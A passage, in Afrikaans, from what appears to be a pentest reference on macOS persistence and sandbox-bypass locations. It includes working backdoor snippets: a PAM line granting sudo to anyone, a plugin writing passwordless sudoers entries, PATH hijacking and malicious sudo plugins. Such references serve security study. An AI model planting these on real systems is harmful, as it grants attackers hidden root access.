  - Word uitgevoer wanneer die betrokke Python-interpreter met daardie werf-gids geaktiveer begin; die sneller is nie universeel vir alle virtuele omgewings, Python-bouweergawes of opstartvlae nie
- TCC-bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Word uitgevoer met die voorregte/TCC van die proses wat die interpreter geloods het

#### Ligging

- **`$(python3 -m site --user-site)/*.pth`** (macOS-raamwerkbouweergawes: `~/Library/Python/<X.Y>/lib/python/site-packages/`)
  - Geen root nodig nie (skryfbaar deur die gebruiker)
  - **Sneller**: opstart van daardie Python-bouweergawe met sy gebruikerswerf geaktiveer; die `site`-module verwerk `.pth`-lêers in aktiewe werfgidse
- **`<site-packages>/*.start`** (Python 3.15+; gebruiker- of interpreter-werfgids)
  - **Sneller**: opstart van ’n interpreter wat die gids insluit en `site` laai.<sup>[[58]](#references)[[59]](#references)</sup>
- **`<user-site>/usercustomize.py`**
  - Geen root nodig nie
  - **Sneller**: opstart met die gebruikerswerf geaktiveer (outomaties deur `site` ingevoer)
- **`<prefix>/site-packages/sitecustomize.py`** (bv. `/opt/homebrew/lib/python3.13/site-packages/`, of stelselpaadjies)
  - Root/admin kan nodig wees, afhangend van die interpreter se ligging
  - **Sneller**: opstart van ’n interpreter wat daardie werfgids insluit

#### Beskrywing & Exploitation

By opstart voer Python gewoonlik `site` in en skandeer sy aktiewe `site-packages`-gidse vir `.pth`-lêers. Benewens die byvoeging van paadjies, voer ’n `.pth`-reël wat met `import ` begin Python-kode uit, selfs al word die genoemde module nooit andersins gebruik nie. Python probeer ook om `sitecustomize` in te voer en, **wanneer die gebruikerswerf geaktiveer is**, `usercustomize`.<sup>[[56]](#references)</sup> Die sneller is ’n latere begin van ’n interpreter wat die gewysigde gids raakloop. `-S` deaktiveer `site`-verwerking; `-s`, `-I` of `PYTHONNOUSERSITE` deaktiveer die **gebruikerswerf**-variante. `-I` deaktiveer nie oor die algemeen ’n globale `sitecustomize` nie. Virtuele omgewings kan ook die gebruikerswerf uitsluit. Kontroleer `python3 -m site` vir die spesifieke interpreter.

Op **Python 3.15 en later** kan ’n werfgids ook `<name>.start` bevat met ’n `pkg.mod:callable`-ingangspunt. Die site-module voer daardie module in en roep die funksie sonder argumente tydens interpreter-opstart aan, selfs al voer die toepassing nooit die pakket in nie. Byvoorbeeld, ’n `foo.start` met `foo.submod:initialize` roep `foo.submod.initialize()` aan voordat gebruikerskode loop. ’n Pakket of akteur wat na ’n aktiewe werfgids kan skryf, kan hierdie opstartpad gebruik; dit is nie beperk tot macOS nie. Wanneer `foo.start` saam met `foo.pth` voorkom, slaan Python 3.15+ die `.pth`-invoerreëls oor ten gunste van die `.start`-ingang, terwyl ouer interpreters `.start` ignoreer en steeds die `.pth`-reël uitvoer. Hierdie weergaweverskil is belangrik wanneer ’n wheel oor verskillende interpreters getoets word.<sup>[[58]](#references)[[59]](#references)[[60]](#references)</sup>

Die volgende PoC is op macOS 26.5.2 uitgevoer. `PYTHONUSERBASE` skuif die gebruikerswerf na ’n tydelike gids vir hierdie toets; geen werklike gebruikerswerf word gewysig nie:

```python
import os, pathlib, subprocess, tempfile

with tempfile.TemporaryDirectory(prefix='ht-python-site-') as root:
    env = os.environ.copy()
    env['PYTHONUSERBASE'] = root
    env.pop('PYTHONNOUSERSITE', None)
    user_site = pathlib.Path(subprocess.check_output(
        ['python3', '-m', 'site', '--user-site'], env=env, text=True
    ).strip())
    user_site.mkdir(parents=True)
    pth_marker = pathlib.Path(root) / 'pth.marker'
    user_marker = pathlib.Path(root) / 'user.marker'
    (user_site / 'ht_probe.pth').write_text(
        'import pathlib; pathlib.Path(' + repr(str(pth_marker)) + ').touch()\n'
    )
    (user_site / 'usercustomize.py').write_text(
        'import pathlib; pathlib.Path(' + repr(str(user_marker)) + ').touch()\n'
    )
    subprocess.run(['python3', '-c', 'pass'], env=env, check=True)
    print('pth:', pth_marker.exists(), 'usercustomize:', user_marker.exists())
```

Albei merkers het verskyn. Deur die toets met `-s`, `-I` of `-S` te herhaal, is albei **user-site**-merkers verhoed. `sitecustomize` in ’n globale site-gids is nie getoets nie.

## Root Sandbox Bypass

> [!TIP]
> Hier kan jy beginliggings vind wat nuttig is vir **sandbox bypass** en jou toelaat om eenvoudig iets uit te voer deur dit **in ’n lêer te skryf** terwyl jy **root** is en/of ander **vreemde voorwaardes** vereis.

### Periodic

> [!CAUTION]
> **Historiese meganisme:** Op die macOS 26.5.2-toetsmasjien ontbreek `/usr/sbin/periodic`, `/etc/defaults/periodic.conf`, `/etc/periodic` en die `com.apple.periodic-*`-launch daemons. Moenie aanvaar dat die skep van `/etc/periodic` op ’n huidige stelsel die inhoud daarvan sal skeduleer nie. Gaan na of beide die opdrag en ’n geaktiveerde skeduleerder op die teikenweergawe bestaan voordat jy die voorbeeld hieronder gebruik.

Skrywe: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)<sup>[[27]](#references)</sup>

- Nuttig om sandbox bypass te doen: [🟠](https://emojipedia.org/large-orange-circle)
  - Maar jy moet root wees
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
  - Root word vereis
  - **Sneller**: Wanneer die tyd aanbreek
- `/etc/daily.local`, `/etc/weekly.local` of `/etc/monthly.local`
  - Root word vereis
  - **Sneller**: Wanneer die tyd aanbreek

#### Beskrywing & Uitbuiting

Op ouer weergawes is die periodic-skripte (**`/etc/periodic`**) deur **launch daemons** in `/System/Library/LaunchDaemons/com.apple.periodic*` geskeduleer. Vanaf macOS Big Sur 11.5 het die periodic-runner skripte in die periodic-gidse as die **eienaar van elke lêer** uitgevoer, wat ’n vorige pad na voorregte-eskalasie afgesluit het.<sup>[[27]](#references)</sup> Die opdragte en gidslyste hieronder is historiese afvoer, nie ’n macOS 26.5.2-toetsresultaat nie.

```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```

Daar is ander periodieke skripte wat uitgevoer sal word, soos aangedui in **`/etc/defaults/periodic.conf`**:

```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```

Op ouer stelsels waarop `periodic` en sy launch daemons geïnstalleer en geaktiveer is, was `/etc/daily.local`, `/etc/weekly.local` en `/etc/monthly.local` bykomende uitvoeringspaaie. ’n Onskadelike leesalleen-kontrole is:

```bash
test -x /usr/sbin/periodic && ls /System/Library/LaunchDaemons/com.apple.periodic-*.plist
```

> [!WARNING]
> Die reël wat op eienaarskap gebaseer is, is op skripte wat direk in die periodieke gidse staan, toegepas. Die historiese `999.local`-wrapper het voorheen `/etc/daily.local`, `/etc/weekly.local` of `/etc/monthly.local` sonder dieselfde eienaarskapkontrole gelaai; wanneer die skeduleerder as root geloop het, het hierdie plaaslike lêers as root geloop. Hierdie onderskeid en die verandering in Big Sur 11.5 word in die [oorspronklike navorsing](https://theevilbit.github.io/beyond/beyond_0019/) gedokumenteer. Daar moet nie aanvaar word dat enige van hierdie paaie aktief is wanneer `periodic` afwesig is nie.

### PAM

Skrywe: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Skrywe: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)<sup>[[28]](#references)</sup>

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
  - Maar jy moet root wees
- TCC-omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- Root word altyd vereis

#### Beskrywing en uitbuiting

Aangesien PAM meer op **persistence** en malware fokus as op maklike uitvoering binne macOS, sal hierdie blog nie ’n gedetailleerde verduideliking gee nie; **lees die skrywes om hierdie tegniek beter te verstaan**.<sup>[[28]](#references)</sup>

Kontroleer PAM-modules met:

```bash
ls -l /etc/pam.d
```

’n persistence/privilege escalation-tegniek wat PAM misbruik, is so eenvoudig soos om die module /etc/pam.d/sudo te wysig en die volgende reël aan die begin by te voeg:

```bash
auth       sufficient     pam_permit.so
```

Dit sal dus **so lyk**:

```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```

En daarom sal enige poging om **`sudo` te gebruik werk**.

> [!CAUTION]
> Let daarop dat hierdie gidsie deur TCC beskerm word, so dit is baie waarskynlik dat die gebruiker ’n versoek sal kry om toegang toe te staan.

Nog ’n goeie voorbeeld is su, waar jy kan sien dat dit ook moontlik is om parameters aan die PAM-modules deur te gee (en jy kan ook hierdie lêer backdoor):

```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```

### Authorization Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)<sup>[[29]](#references)</sup>\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)<sup>[[30]](#references)</sup>

- Nuttig om sandbox te bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - Maar jy moet root wees en ekstra configs maak
- TCC bypass: ???

#### Ligging

- `/Library/Security/SecurityAgentPlugins/`
  - Root word vereis
  - Dit is ook nodig om die authorization-databasis op te stel om die plugin te gebruik

#### Beskrywing & Exploitation

Jy kan ’n authorization-plugin skep wat uitgevoer word wanneer ’n gebruiker aanmeld, om persistence te behou. Vir meer inligting oor hoe om een van hierdie plugins te skep, raadpleeg die vorige writeups (en wees versigtig: ’n swak geskryfde plugin kan jou uitsluit, en jy sal jou Mac vanuit recovery mode moet herstel).<sup>[[29]](#references)[[30]](#references)</sup>

```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
    NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
    system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```

**Skuif** die bundle na die ligging waar dit gelaai sal word:

```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```

Voeg laastens die **reël** by om hierdie Plugin te laai:

```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
            <key>class</key>
            <string>evaluate-mechanisms</string>
            <key>mechanisms</key>
            <array>
                <string>CustomAuth:login,privileged</string>
            </array>
        </dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```

Die **`evaluate-mechanisms`** sal die magtigingsraamwerk laat weet dat dit **’n eksterne meganisme vir magtiging moet aanroep**. Boonop sal **`privileged`** veroorsaak dat dit as root uitgevoer word.

Aktiveer dit met:

```bash
security authorize com.asdf.asdf
```

En dan behoort die **staff-groep sudo**-toegang te hê (lees `/etc/sudoers` om dit te bevestig).

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)<sup>[[31]](#references)</sup>

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
  - Maar jy moet root wees en die gebruiker moet man gebruik
- TCC-bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- **`/private/etc/man.conf`**
  - Root word vereis
  - **`/private/etc/man.conf`**: Wanneer man gebruik word

#### Beskrywing en uitbuiting

Die konfigurasielêer **`/private/etc/man.conf`** dui die binary/script aan wat gebruik word wanneer man-dokumentasielêers oopgemaak word. Die pad na die uitvoerbare lêer kan dus gewysig word sodat ’n backdoor uitgevoer word wanneer die gebruiker man gebruik om dokumentasie te lees.<sup>[[31]](#references)</sup>

Stel byvoorbeeld in **`/private/etc/man.conf`**:

```
MANPAGER /tmp/view
```

En skep dan `/tmp/view` soos volg:

```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```

### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)<sup>[[32]](#references)</sup>

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
  - Maar jy moet root wees en Apache moet loop
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Httpd het nie entitlements nie

#### Ligging

- **`/etc/apache2/httpd.conf`**
  - Root word vereis
  - Sneller: Wanneer Apache2 begin word

#### Beskrywing & Exploit

Jy kan in `/etc/apache2/httpd.conf` aandui dat ’n module gelaai moet word deur ’n reël soos die volgende by te voeg:<sup>[[32]](#references)</sup>

```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```

Op hierdie manier sal Apache jou saamgestelde module laai. Die enigste ding is dat jy dit óf **met ’n geldige Apple-sertifikaat moet onderteken**, óf **’n nuwe vertroude sertifikaat by die stelsel moet voeg** en dit daarmee **moet onderteken**.

Dan kan jy, indien nodig, die volgende uitvoer om seker te maak dat die bediener begin:

```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```

Kodevoorbeeld vir die Dylb:

```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
     printf("[+] dylib constructor called from %s\n", argv[0]);
     syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```

### BSM-ouditraamwerk

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)<sup>[[33]](#references)</sup>

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
  - Maar jy moet root wees, auditd moet loop en ’n waarskuwing veroorsaak
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- **`/etc/security/audit_warn`**
  - Root word vereis
  - **Sneller**: Wanneer auditd ’n waarskuwing bespeur

#### Beskrywing & uitbuiting

Wanneer auditd ’n waarskuwing bespeur, word die skrip **`/etc/security/audit_warn`** **uitgevoer**. Jy kan dus jou payload daarby voeg.<sup>[[33]](#references)</sup>

```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```

Jy kan ’n waarskuwing afdwing met `sudo audit -n`.

### Opstartitems

> [!CAUTION] > **Dit is verouderd, dus behoort niks in daardie gidse gevind te word nie.**

Die **StartupItem** is ’n gids wat óf in `/Library/StartupItems/` óf in `/System/Library/StartupItems/` geplaas moet word. Sodra hierdie gids geskep is, moet dit twee spesifieke lêers bevat:

1. ’n **rc script**: ’n Shell script wat tydens opstart uitgevoer word.
2. ’n **plist file**, spesifiek genaamd `StartupParameters.plist`, wat verskeie konfigurasie-instellings bevat.

Maak seker dat beide die rc script en die `StartupParameters.plist`-lêer korrek binne die **StartupItem**-gids geplaas is, sodat die opstartproses dit kan herken en gebruik.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Description</key>
        <string>This is a description of this service</string>
    <key>OrderPreference</key>
        <string>None</string> <!--Other req services to execute before this -->
    <key>Provides</key>
    <array>
        <string>superservicename</string> <!--Name of the services provided by this file -->
    </array>
</dict>
</plist>
```

{{#endtab}}

{{#tab name="superservicename"}}

```bash
#!/bin/sh
. /etc/rc.common

StartService(){
    touch /tmp/superservicestarted
}

StopService(){
    rm /tmp/superservicestarted
}

RestartService(){
    echo "Restarting"
}

RunService "$1"
```

{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Ek kan nie hierdie komponent in my macOS vind nie, so kyk na die writeup vir meer inligting.

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)<sup>[[34]](#references)</sup>

**emond**, wat deur Apple bekendgestel is, is ’n aantekenmeganisme wat blykbaar onderontwikkel of moontlik laat vaar is, maar steeds toeganklik is. Hoewel hierdie obskure diens nie juis nuttig vir ’n Mac-administrateur is nie, kan dit as ’n subtiele volhardingsmetode vir bedreigingsakteurs dien, waarskynlik sonder dat die meeste macOS-administrateurs dit opmerk.<sup>[[34]](#references)</sup>

Vir diegene wat van die bestaan daarvan weet, is dit maklik om enige kwaadwillige gebruik van **emond** te identifiseer. Die stelsel se LaunchDaemon vir hierdie diens soek na skrifte om in ’n enkele gids uit te voer. Die volgende opdrag kan gebruik word om dit te ondersoek:

```bash
ls -l /private/var/db/emondClients
```

### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

#### Ligging

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
  - Root word vereis
  - **Sneller**: Met XQuartz

#### Beskrywing & Uitbuiting

XQuartz word **nie meer in macOS geïnstalleer nie**, so kyk na die writeup as jy meer inligting wil hê.<sup>[[3]](#references)</sup>

### ~~kext~~

> [!CAUTION]
> Dit is so ingewikkeld om ’n kext te installeer, selfs as root, dat dit nie as ’n praktiese sandbox-escape- of persistence-tegniek beskou word nie, tensy jy ’n exploit het.

#### Ligging

Om ’n KEXT as ’n opstartitem te installeer, moet dit **op een van die volgende liggings geïnstalleer word**:

- `/System/Library/Extensions`
  - KEXT-lêers wat in die OS X-bedryfstelsel ingebou is.
- `/Library/Extensions`
  - KEXT-lêers wat deur derdeparty-sagteware geïnstalleer is

Jy kan die tans gelaaide kext-lêers lys met:

```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```

Vir meer inligting oor [**kernel extensions, kyk na hierdie afdeling**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Ontleding: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)<sup>[[35]](#references)</sup>

#### Ligging

- **`/usr/local/bin/amstoold`**
  - Root word vereis

#### Beskrywing en uitbuiting

Dit lyk asof die `plist` van `/System/Library/LaunchAgents/com.apple.amstoold.plist` hierdie binary gebruik het terwyl dit ’n XPC-diens blootgestel het... Die ding is dat die binary nie bestaan het nie, so jy kon iets daar plaas en wanneer die XPC-diens opgeroep word, sou jou binary opgeroep word.<sup>[[35]](#references)</sup>

Ek kan dit nie meer in my macOS vind nie.

### ~~xsanctl~~

Ontleding: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)<sup>[[36]](#references)</sup>

#### Ligging

- **`/Library/Preferences/Xsan/.xsanrc`**
  - Root word vereis
  - **Sneller**: Wanneer die diens uitgevoer word (selde)

#### Beskrywing en uitbuiting

Dit lyk asof hierdie script nie baie gereeld uitgevoer word nie, en ek kon dit nie eens in my macOS vind nie. Kyk dus na die ontleding as jy meer inligting wil hê.<sup>[[36]](#references)</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **Dit werk nie in moderne MacOS-weergawes nie**

Dit is ook moontlik om **opdragte wat tydens opstart uitgevoer sal word** hier te plaas. Voorbeeld van ’n gewone rc.common-script:

```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
    local test

    if [ -z "${NETWORKUP:=}" ]; then
	test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
	if [ "${test}" -gt 0 ]; then
	    NETWORKUP="-YES-"
	else
	    NETWORKUP="-NO-"
	fi
    fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
    local program="$1"
    local pidfile="${PIDFILE:=/var/run/${program}.pid}"
    local     pid=""

    if [ -f "${pidfile}" ]; then
	pid=$(head -1 "${pidfile}")
	if ! kill -0 "${pid}" 2> /dev/null; then
	    echo "Bad pid file $pidfile; deleting."
	    pid=""
	    rm -f "${pidfile}"
	fi
    fi

    if [ -n "${pid}" ]; then
	echo "${pid}"
	return 0
    else
	return 1
    fi
}

#
# Generic action handler
#
RunService ()
{
    case $1 in
      start  ) StartService   ;;
      stop   ) StopService    ;;
      restart) RestartService ;;
      *      ) echo "$0: unknown argument: $1";;
    esac
}
```

### launchd-selflaaitake

Writeup: [https://theevilbit.github.io/beyond/beyond_0034/](https://theevilbit.github.io/beyond/beyond_0034/)<sup>[[40]](#references)</sup>

- Nuttig om sandbox te omseil: [🔴](https://emojipedia.org/large-red-circle) (root word vereis)
- Root word vereis, plus óf ’n **SIP-omseiling** óf die **`kTCCServiceSystemPolicySysAdminFiles`**-/Full Disk Access-toestemming, afhangend van die pad

#### Ligging

`launchd` sluit ’n plist in sy **`__TEXT,__config`**-afdeling in wat vroeë "selflaaitake" beskryf. Verskeie verwysingskripte/-binaries wat **nie** by verstek bestaan nie en deur ’n aanvaller geskep kan word:

- SIP-omseilingstel: **`/Library/Apple/usr/libexec/finish_demo_restore`**, **`/private/var/install/shutdown_installer_tasks`**, **`/private/var/install/deferred_install`**
- TCC/FDA-stel: **`/etc/rc.server`**, **`/etc/rc.cdrom`**, **`/etc/rc.netboot`** (`rc.netboot` bestaan vooraf slegs op Sequoia+)

#### Beskrywing en uitbuiting

Dump die ingebedde taakstabel om te sien watter lêers `launchd` sal uitvoer en watter sleutels ondersteun word (`Program`, `ProgramArguments`, `PerformAfterUserspaceReboot`, `RequireSuccess`…):

```bash
otool -X -s __TEXT __config /sbin/launchd | awk '{print $2 $3 $4 $5}' | \
  xxd -r -p | hexdump -v -e '1/4 "%08x"' -e '"\n"' | xxd -r -p
```

Die skep van een van die verwysde lêers (bv. `/etc/rc.server`) laat `launchd` dit tydens die volgende (userspace-)herlaai uitvoer. Die nuttigste inskrywings word deur SIP beperk of vereis TCC SysAdminFiles/Full Disk Access, dus is dit ’n tegniek op root-vlak wat deur ’n herlaai geaktiveer word.<sup>[[40]](#references)</sup>

### ~~NVRAM (`apple-trusted-trampoline`)~~

Skrywe: [https://theevilbit.github.io/beyond/beyond_0035/](https://theevilbit.github.io/beyond/beyond_0035/)<sup>[[41]](#references)</sup>

Die `rc.trampoline`-selflaaitaak voer tydens selflaai ’n **platform (Apple-ondertekende) binêre lêer** uit wat in die `apple-trusted-trampoline` NVRAM-veranderlike gestoor is, maar **slegs wanneer die `rc.trampoline=1`-selflaaiargument gestel is en SIP gedeaktiveer is** (met ’n groottebeperking van ongeveer 390&nbsp;KB en ’n beperking wat vereis dat dit blokkeer of vinnig terugkeer). Omdat dit **root + gedeaktiveerde SIP + ’n Apple-ondertekende loonvrag** vereis, is dit in wese onprakties vir volharding in die werklike wêreld en word dit hier slegs ter volledigheid gelys.<sup>[[41]](#references)</sup>

### /etc/paths and /etc/paths.d (PATH-kaping)

- Nuttig om sandbox te omseil: [🔴](https://emojipedia.org/large-red-circle) (root is nodig om te skryf)
- Root word vereis

#### Ligging

- **`/etc/paths`** en **`/etc/paths.d/*`** — word deur **`path_helper`** gelees (wat vanuit `/etc/zprofile` aangeroep word) om die verstek-`PATH` tydens aanmelding saam te stel.

#### Beskrywing en uitbuiting

Albei is root-besit. Deur ’n aanvaller-beheerde gids vooraan te plaas (deur `/etc/paths` te wysig of ’n lêer in `/etc/paths.d/` te plaas), verskyn daardie gids vroeg in elke nuwe aanmeldingshell se `PATH`. ’n Kwaadwillige binêre lêer met die naam van ’n algemene opdrag (`ls`, `git`, …) **oorskadu** dan die regte een en loop die volgende keer dat die slagoffer dit aanroep.

```bash
# e.g. Homebrew already ships a /etc/paths.d entry; an attacker drops their own
echo "/private/tmp/evil" | sudo tee /etc/paths.d/00-evil
# -> /private/tmp/evil is prepended to PATH for new login shells
```

### storagekitd SIP Bypass (CVE-2024-44243)

Writeup: [https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)<sup>[[46]](#references)</sup>

- Nuttig om sandbox te omseil: [🔴](https://emojipedia.org/large-red-circle) (root word benodig)
- Root word benodig; die resultaat **omseil SIP**. macOS-weergawes **15.0–15.1** is geraak; reggestel in **15.2**

#### Ligging

- Plaas ’n filesystem-bundel in **`/Library/Filesystems/`**.

#### Beskrywing & Uitbuiting

`storagekitd` het die entitlement **`com.apple.rootless.install.heritable`** en het die binaries van filesystem-bundels met daardie SIP-omseilingsvermoë **geërf** laat loop. Deur ’n kwaadwillige filesystem-bundel daar te plaas, kon ’n aanvaller kode met ’n SIP-omseiling uitvoer om **aanhoudende kernel extensions** te installeer of na SIP-beskermde `LaunchDaemon`-gidse te skryf — volharding wat oorleef en normale beskerming verydel.<sup>[[46]](#references)</sup> Apple het dit in macOS Sequoia 15.2 reggestel.

### sudo plugins (/etc/sudo.conf)

Writeup: [On Writing Sudo Plugins (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)<sup>[[51]](#references)</sup>

- Nuttig om sandbox te omseil: [🔴](https://emojipedia.org/large-red-circle) (root is nodig om na `/etc/sudo.conf` te skryf)
- Root is nodig om dit te installeer; die plugin loop daarna binne **elke `sudo`-aanroep** (setuid-root-konteks)

#### Ligging

- **`/etc/sudo.conf`** — `Plugin`-reëls laai gedeelde objeklêers vanaf **`/usr/libexec/sudo/`** (of ’n absolute pad). Dit bestaan nie by verstek nie (sudo gebruik ’n ingeboude beleid), dus is die skep daarvan ’n skoon hook.

#### Beskrywing & Uitbuiting

`sudo` laai sy beleid-/goedkeurings-/ouditplugins vanaf `/etc/sudo.conf`. Omdat `sudo` setuid-root is, voer ’n kwaadwillige shared-object-plugin met **root-voorregte uit elke keer wanneer enige gebruiker `sudo` uitvoer** — volhoubare root-volharding wat ook elke sudo-opdrag waarneem.<sup>[[51]](#references)</sup> macOS word met sudo 1.9.x gelewer, wat die plugin-API ondersteun.

```bash
# As root: load a malicious audit/approval plugin on every sudo
cat > /etc/sudo.conf <<'CONF'
Plugin sudoers_policy sudoers.so
Plugin ht_audit /usr/libexec/sudo/ht_audit.so
CONF
# ht_audit.so's constructor / audit_open runs as root on the next `sudo <anything>`
```

### CoreMediaIO DAL Plug-Ins

Beskrywing: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>\
Minimale voorbeeld: [https://github.com/johnboiles/coremediaio-dal-minimal-example](https://github.com/johnboiles/coremediaio-dal-minimal-example)<sup>[[54]](#references)</sup>

- **Verouderde meganisme:** Afgekeur sedert macOS 12.3. macOS 14.1 en latere weergawes deaktiveer verouderde video-inproppe by verstek. ’n Gebruiker moet verouderde videosteun vanuit Recovery herstel voordat hierdie pad kan werk; ’n skryfbare gids alleen is onvoldoende. [Apple se huidige ondersteuningsriglyne](https://support.apple.com/en-us/108387).
- Root is nodig om na die inpropgids te skryf. Enige kode-uitvoering hang af van ’n versoenbare kliënt wat steeds DAL-inproppe laai; dit is nie tydens looptyd op macOS 26 getoets nie.

#### Ligging

- **`/Library/CoreMediaIO/Plug-Ins/DAL/*.plugin`**
  - Root is nodig
